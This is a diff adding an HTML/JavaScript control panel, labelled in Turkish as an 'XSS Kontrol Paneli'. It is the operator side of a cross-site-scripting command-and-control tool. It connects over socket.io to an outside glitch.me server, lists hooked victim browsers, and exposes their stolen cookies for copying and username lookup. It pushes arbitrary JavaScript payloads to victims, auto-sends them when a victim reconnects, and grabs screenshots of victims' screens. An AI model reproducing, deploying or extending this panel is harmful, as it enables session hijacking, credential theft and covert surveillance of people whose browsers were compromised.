@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS Kontrol Paneli</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f9; color: #333; margin: 0; }
+        h1 { text-align: center; color: #2c3e50; }
+        #payloadForm, #clientList { max-width: 800px; margin: 20px auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        #clientSearch { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        #clientList table { width: 100%; border-collapse: collapse; table-layout: fixed; }
+        #clientList th, #clientList td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
+        #clientList th { background: #2c3e50; color: #fff; }
+        #clientList tr:hover { background: #f0f0f0; }
+        #clientList button { padding: 5px 10px; background: #3498db; color: #fff; border: none; border-radius: 4px; cursor: pointer; margin-right: 5px; }
+        #clientList button:hover { background: #2980b9; }
+        #clientList button.copy-btn { background: #f1c40f; }
+        #clientList button.copy-btn:hover { background: #d4ac0d; }
+        #clientList button.update-btn { background: #2ecc71; }
+        #clientList button.update-btn:hover { background: #27ae60; }
+        #payloadForm select, #payloadForm textarea, #payloadForm input, #payloadForm button { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        #payloadForm button { background: #e74c3c; color: #fff; border: none; cursor: pointer; transition: background 0.3s, transform 0.1s; }
+        #payloadForm button:hover { background: #c0392b; }
+        #payloadForm #savePayloadBtn { background: #2ecc71; }
+        #payloadForm #savePayloadBtn:hover { background: #27ae60; }
+        #payloadForm #startAutoSendBtn { background: #3498db; }
+        #payloadForm #startAutoSendBtn:hover { background: #2980b9; }
+        #payloadForm #stopAutoSendBtn { background: #e74c3c; }
+        #payloadForm #stopAutoSendBtn:hover { background: #c0392b; }
+        #payloadForm #takeScreenshotBtn { background: #9b59b6; }
+        #payloadForm #takeScreenshotBtn:hover { background: #8e44ad; }
+        #payloadForm #closeScreenshotBtn { background: #7f8c8d; }
+        #payloadForm #closeScreenshotBtn:hover { background: #6c7a89; }
+        #payloadForm button.success { background: #2ecc71; }
+        #payloadForm button.error { background: #e74c3c; transform: scale(0.95); }
+        #selectedClient { color: #e74c3c; font-weight: bold; }
+        #clientStatus.active { color: #2ecc71; font-weight: bold; }
+        #clientStatus.inactive { color: #e74c3c; font-weight: bold; }
+        #clients { min-height: 100px; }
+        .client-active { color: #2ecc71; }
+        .client-inactive { color: #e74c3c; }
+        #screenshotImage { max-width: 100%; height: auto; border: 1px solid #ddd; border-radius: 4px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h1>XSS Kontrol Paneli</h1>
+    <div id="payloadForm">
+        <h2>Payload Gönder</h2>
+        <p>Seçilen Client: <span id="selectedClient">Henüz seçilmedi</span> <span id="clientStatus"></span></p>
+        <img id="screenshotImage" src="" alt="Ekran görüntüsü burada gösterilecek" style="display: none;">
+        <select id="clientSelect" onchange="selectClient()">
+            <option value="">Client Seç</option>
+        </select>
+        <select id="payloadSelect" onchange="loadPayload()">
+            <option value="">Payload Seç</option>
+            <option value="alert('Hacked!')">Alert: Hacked!</option>
+            <option value="console.log('Test')">Konsol: Test</option>
+            <option value="document.body.style.background='red'">Arka Plan: Kırmızı</option>
+        </select>
+        <textarea id="payloadInput" rows="5" placeholder="Payload kodunu buraya yaz"></textarea>
+        <input type="text" id="payloadName" placeholder="Payload için isim gir">
+        <button id="savePayloadBtn" onclick="savePayload()">Payload Kaydet</button>
+        <button id="sendPayloadBtn" onclick="sendPayload()">Payload Gönder</button>
+        <button id="startAutoSendBtn" onclick="startAutoSend()">Otomatik Gönderimi Başlat</button>
+        <button id="stopAutoSendBtn" onclick="stopAutoSend()">Otomatik Gönderimi Durdur</button>
+        <button id="takeScreenshotBtn" onclick="takeScreenshot()">Ekran Görüntüsü Al</button>
+        <button id="closeScreenshotBtn" onclick="closeScreenshot()">Ekran Görüntüsünü Kapat</button>
+    </div>
+    <div id="clientList">
+        <h2>Bağlı Client’lar</h2>
+        <input type="text" id="clientSearch" placeholder="Client ismi ara...">
+        <table>
+            <thead>
+                <tr>
+                    <th>İsim</th>
+                    <th>Son Aktif Zaman</th>
+                    <th>İşlem</th>
+                </tr>
+            </thead>
+            <tbody id="clients"></tbody>
+        </table>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io('https://intriguing-insidious-trout.glitch.me');
+        const clientList = document.getElementById('clients');
+        const clientSearch = document.getElementById('clientSearch');
+        const payloadForm = document.getElementById('payloadForm');
+        const selectedClientSpan = document.getElementById('selectedClient');
+        const clientStatusSpan = document.getElementById('clientStatus');
+        const clientSelect = document.getElementById('clientSelect');
+        const payloadSelect = document.getElementById('payloadSelect');
+        const payloadInput = document.getElementById('payloadInput');
+        const payloadName = document.getElementById('payloadName');
+        const sendPayloadBtn = document.getElementById('sendPayloadBtn');
+        const takeScreenshotBtn = document.getElementById('takeScreenshotBtn');
+        const closeScreenshotBtn = document.getElementById('closeScreenshotBtn');
+        const screenshotImage = document.getElementById('screenshotImage');
+        let selectedClient = localStorage.getItem('selectedClient') || null;
+        let currentClients = [];
+        let autoSendEnabled = false;
+        let lastActiveState = false;
+
+        let customNames = JSON.parse(localStorage.getItem('customNames')) || {};
+        let savedPayloads = JSON.parse(localStorage.getItem('savedPayloads')) || [];
+        savedPayloads.forEach(p => {
+            const option = document.createElement('option');
+            option.value = p.code;
+            option.textContent = p.name;
+            payloadSelect.appendChild(option);
+        });
+
+        socket.on('clientList', (clients) => {
+            // Mevcut istemcilerin lastActiveTime değerlerini koru
+            currentClients = clients.map(client => {
+                const existingClient = currentClients.find(c => c.id === client.id);
+                return {
+                    ...client,
+                    lastActiveTime: existingClient ? existingClient.lastActiveTime : client.lastActiveTime || null
+                };
+            });
+            updateClientList();
+            updateClientSelect();
+        });
+
+        socket.on('clientUpdate', (updates) => {
+            updates.forEach(update => {
+                if (update.event === 'connect') {
+                    const existing = currentClients.find(c => c.id === update.data.id);
+                    if (!existing) {
+                        currentClients.push({
+                            ...update.data,
+                            lastActiveTime: update.data.isActive ? new Date().toISOString() : null
+                        });
+                    } else {
+                        existing.isActive = update.data.isActive;
+                        if (update.data.isActive && !existing.lastActiveTime) {
+                            existing.lastActiveTime = new Date().toISOString();
+                        }
+                    }
+                } else if (update.event === 'disconnect') {
+                    currentClients = currentClients.filter(c => c.id !== update.data.id);
+                } else if (update.event === 'updateName') {
+                    const client = currentClients.find(c => c.id === update.data.id);
+                    if (client) {
+                        client.username = update.data.username;
+                    }
+                }
+            });
+            updateClientList();
+            updateClientSelect();
+        });
+
+        socket.on('clientStatusUpdate', (status) => {
+            const client = currentClients.find(c => c.id === status.clientId);
+            if (client) {
+                const wasInactive = !client.isActive;
+                client.isActive = status.isActive;
+                if (wasInactive && status.isActive) {
+                    client.lastActiveTime = new Date().toISOString();
+                }
+                updateClientList();
+                updateClientSelect();
+                if (autoSendEnabled && selectedClient === status.clientId) {
+                    if (status.isActive && !lastActiveState) {
+                        sendPayload();
+                        console.log(`Payload gönderildi: ${selectedClient} pasiften aktife geçti`);
+                    }
+                    lastActiveState = status.isActive;
+                }
+            }
+        });
+
+        socket.on('screenshotUpdate', ({ clientId, screenshot }) => {
+            if (clientId === selectedClient) {
+                screenshotImage.src = screenshot;
+                screenshotImage.style.display = 'block';
+            }
+        });
+
+        function formatDateTime(isoString) {
+            if (!isoString) return 'Bilinmiyor';
+            const date = new Date(isoString);
+            return date.toLocaleString('tr-TR', {
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+        }
+
+        function updateClientList() {
+            const searchTerm = clientSearch.value.toLowerCase();
+            const filteredClients = currentClients
+                .filter(client => (customNames[client.id] || client.username).toLowerCase().includes(searchTerm))
+                .sort((a, b) => {
+                    if (!a.lastActiveTime && !b.lastActiveTime) return b.isActive - a.isActive;
+                    if (!a.lastActiveTime) return 1;
+                    if (!b.lastActiveTime) return -1;
+                    return new Date(b.lastActiveTime) - new Date(a.lastActiveTime);
+                });
+
+            // Tabloyu tamamen temizle
+            clientList.innerHTML = '';
+
+            // Sıralanmış istemcileri tabloya ekle
+            filteredClients.forEach(client => {
+                const clientName = customNames[client.id] || client.username;
+                const displayName = `${clientName} (${client.isActive ? 'Aktif' : 'Pasif'})`;
+                const row = document.createElement('tr');
+                row.dataset.clientId = client.id;
+                const nameTd = document.createElement('td');
+                const timeTd = document.createElement('td');
+                const actionTd = document.createElement('td');
+                nameTd.textContent = displayName;
+                nameTd.className = client.isActive ? 'client-active' : 'client-inactive';
+                timeTd.textContent = formatDateTime(client.lastActiveTime);
+                const editBtn = document.createElement('button');
+                editBtn.textContent = 'Düzenle';
+                editBtn.onclick = () => editClientName(client.id, clientName);
+                const copyBtn = document.createElement('button');
+                copyBtn.textContent = 'Cookie Kopyala';
+                copyBtn.className = 'copy-btn';
+                copyBtn.onclick = () => copyCookies(client.cookies);
+                const updateBtn = document.createElement('button');
+                updateBtn.textContent = 'Cookie Güncelle';
+                updateBtn.className = 'update-btn';
+                updateBtn.onclick = () => updateClientName(client.id, client.cookies);
+                actionTd.appendChild(editBtn);
+                actionTd.appendChild(copyBtn);
+                actionTd.appendChild(updateBtn);
+                row.appendChild(nameTd);
+                row.appendChild(timeTd);
+                row.appendChild(actionTd);
+                row.onclick = (e) => {
+                    if (e.target !== editBtn && e.target !== copyBtn && e.target !== updateBtn) {
+                        selectedClient = client.id;
+                        localStorage.setItem('selectedClient', selectedClient);
+                        clientSelect.value = client.id;
+                        updateSelectedClientDisplay();
+                        payloadForm.style.display = 'block';
+                        screenshotImage.src = '';
+                        screenshotImage.style.display = 'none';
+                    }
+                };
+                clientList.appendChild(row);
+            });
+
+            updateSelectedClientDisplay();
+        }
+
+        clientSearch.addEventListener('input', () => {
+            updateClientList();
+            updateClientSelect();
+        });
+
+        function updateClientSelect() {
+            const currentValue = clientSelect.value;
+            clientSelect.innerHTML = '<option value="">Client Seç</option>';
+            const sortedClients = currentClients.sort((a, b) => {
+                if (!a.lastActiveTime && !b.lastActiveTime) return b.isActive - a.isActive;
+                if (!a.lastActiveTime) return 1;
+                if (!b.lastActiveTime) return -1;
+                return new Date(b.lastActiveTime) - new Date(a.lastActiveTime);
+            });
+            sortedClients.forEach(client => {
+                const clientName = customNames[client.id] || client.username;
+                const option = document.createElement('option');
+                option.value = client.id;
+                option.textContent = clientName + (client.isActive ? '' : ' (Pasif)');
+                clientSelect.appendChild(option);
+            });
+            if (selectedClient && currentClients.some(client => client.id === selectedClient)) {
+                clientSelect.value = selectedClient;
+            } else if (currentValue && currentClients.some(client => client.id === currentValue)) {
+                clientSelect.value = currentValue;
+            }
+        }
+
+        function selectClient() {
+            selectedClient = clientSelect.value;
+            localStorage.setItem('selectedClient', selectedClient);
+            const client = currentClients.find(c => c.id === selectedClient);
+            lastActiveState = client ? client.isActive : false;
+            updateSelectedClientDisplay();
+            payloadForm.style.display = 'block';
+            screenshotImage.src = '';
+            screenshotImage.style.display = 'none';
+        }
+
+        function updateSelectedClientDisplay() {
+            const selectedClientData = currentClients.find(client => client.id === selectedClient);
+            if (selectedClient && selectedClientData) {
+                const clientName = customNames[selectedClient] || selectedClientData.username;
+                const displayName = `${clientName} (${selectedClientData.isActive ? 'Aktif' : 'Pasif'})`;
+                selectedClientSpan.textContent = displayName;
+                selectedClientSpan.className = selectedClientData.isActive ? 'client-active' : 'client-inactive';
+                clientStatusSpan.textContent = '';
+                clientStatusSpan.className = '';
+            } else if (selectedClient) {
+                const clientName = customNames[selectedClient] || selectedClient;
+                selectedClientSpan.textContent = `${clientName} (Pasif)`;
+                selectedClientSpan.className = 'client-inactive';
+                clientStatusSpan.textContent = '';
+                clientStatusSpan.className = '';
+            } else {
+                selectedClientSpan.textContent = 'Henüz seçilmedi';
+                selectedClientSpan.className = '';
+                clientStatusSpan.textContent = '';
+                clientStatusSpan.className = '';
+            }
+        }
+
+        function copyCookies(cookies) {
+            navigator.clipboard.writeText(cookies || '');
+            alert('Cookies kopyalandı!');
+        }
+
+        function editClientName(clientId, currentName) {
+            const newName = prompt('Yeni isim gir:', currentName);
+            if (newName && newName.trim()) {
+                customNames[clientId] = newName.trim();
+                localStorage.setItem('customNames', JSON.stringify(customNames));
+                socket.emit('updateName', { clientId, newName: newName.trim() });
+                updateClientList();
+                updateClientSelect();
+                updateSelectedClientDisplay();
+            }
+        }
+
+        function updateClientName(clientId, cookies) {
+            fetch('/fetchUsername', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientId, cookies })
+            })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.username && data.username !== 'Hata' && data.username !== 'Bulunamadı') {
+                        customNames[clientId] = data.username;
+                        localStorage.setItem('customNames', JSON.stringify(customNames));
+                        socket.emit('updateName', { clientId, newName: data.username });
+                        updateClientList();
+                        updateClientSelect();
+                        updateSelectedClientDisplay();
+                    }
+                })
+                .catch(err => console.error('fetchUsername hatası:', err));
+        }
+
+        function loadPayload() {
+            payloadInput.value = payloadSelect.value;
+        }
+
+        function savePayload() {
+            const name = payloadName.value.trim();
+            const code = payloadInput.value.trim();
+            if (name && code) {
+                savedPayloads = savedPayloads.filter(p => p.name !== name);
+                savedPayloads.push({ name, code });
+                localStorage.setItem('savedPayloads', JSON.stringify(savedPayloads));
+                const option = document.createElement('option');
+                option.value = code;
+                option.textContent = name;
+                payloadSelect.appendChild(option);
+                payloadSelect.value = code;
+                payloadName.value = '';
+                alert('Payload kaydedildi!');
+            } else {
+                alert('İsim ve payload gir!');
+            }
+        }
+
+        function sendPayload() {
+            const payload = payloadInput.value;
+            if (selectedClient && payload) {
+                sendPayloadBtn.className = '';
+                fetch('/sendPayload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ clientId: selectedClient, payload })
+                })
+                    .then(res => {
+                        if (res.ok) {
+                            sendPayloadBtn.classList.add('success');
+                            setTimeout(() => sendPayloadBtn.className = '', 1000);
+                            return res.text();
+                        } else {
+                            sendPayloadBtn.classList.add('error');
+                            setTimeout(() => sendPayloadBtn.className = '', 1000);
+                            throw new Error('Payload gönderilemedi');
+                        }
+                    })
+                    .then(text => console.log('Payload gönderim sonucu:', text))
+                    .catch(err => {
+                        sendPayloadBtn.classList.add('error');
+                        setTimeout(() => sendPayloadBtn.className = '', 1000);
+                        console.error('Payload gönderim hatası:', err);
+                    });
+            } else {
+                sendPayloadBtn.classList.add('error');
+                setTimeout(() => sendPayloadBtn.className = '', 1000);
+                console.error('Hata: Client veya payload eksik');
+            }
+        }
+
+        function takeScreenshot() {
+            if (selectedClient) {
+                takeScreenshotBtn.className = '';
+                fetch('/takeScreenshot', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ clientId: selectedClient })
+                })
+                    .then(res => {
+                        if (res.ok) {
+                            takeScreenshotBtn.classList.add('success');
+                            setTimeout(() => takeScreenshotBtn.className = '', 1000);
+                            return res.text();
+                        } else {
+                            takeScreenshotBtn.classList.add('error');
+                            setTimeout(() => takeScreenshotBtn.className = '', 1000);
+                            throw new Error('Ekran görüntüsü alınamadı');
+                        }
+                    })
+                    .then(text => console.log('Ekran görüntüsü sonucu:', text))
+                    .catch(err => {
+                        takeScreenshotBtn.classList.add('error');
+                        setTimeout(() => takeScreenshotBtn.className = '', 1000);
+                        console.error('Ekran görüntüsü hatası:', err);
+                    });
+            } else {
+                takeScreenshotBtn.classList.add('error');
+                setTimeout(() => takeScreenshotBtn.className = '', 1000);
+                alert('Lütfen bir client seçin!');
+            }
+        }
+
+        function closeScreenshot() {
+            screenshotImage.src = '';
+            screenshotImage.style.display = 'none';
+            closeScreenshotBtn.classList.add('success');
+            setTimeout(() => closeScreenshotBtn.className = '', 1000);
+        }
+
+        function startAutoSend() {
+            if (selectedClient && payloadInput.value.trim()) {
+                autoSendEnabled = true;
+                const client = currentClients.find(c => c.id === selectedClient);
+                lastActiveState = client ? client.isActive : false;
+                if (client && client.isActive && !lastActiveState) {
+                    sendPayload();
+                    lastActiveState = true;
+                }
+                document.getElementById('startAutoSendBtn').classList.add('success');
+                document.getElementById('stopAutoSendBtn').classList.remove('success');
+            } else {
+                alert('Lütfen bir client ve payload seçin!');
+            }
+        }
+
+        function stopAutoSend() {
+            autoSendEnabled = false;
+            lastActiveState = false;
+            document.getElementById('stopAutoSendBtn').classList.add('success');
+            document.getElementById('startAutoSendBtn').classList.remove('success');
+        }
+
+        // İlk istemci listesini talep et
+        socket.emit('requestClientList');
+    </script>
+</body>
+</html>
